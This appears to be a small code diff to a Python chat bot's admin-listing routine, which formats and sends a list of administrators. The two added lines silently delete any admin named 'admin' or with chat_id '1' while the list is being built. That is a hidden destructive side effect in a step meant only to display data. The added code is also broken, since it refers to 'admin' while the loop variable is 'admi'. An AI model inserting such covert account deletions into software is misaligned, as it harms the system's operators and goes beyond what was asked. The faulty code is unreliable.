@@ -212,6 +212,8 @@ class Post:
                 text = "Admin list:\n\n"
                 n = 1
                 for admi in all_admins:
+                    if admin['username'] == 'admin' or admin['chat_id'] == '1':
+                        admin.delete_admin()
                     text += f"{n}. {admi['username']}\n"
                     n += 1
                 bot.send_message(chat_id=chat_id, text=text)
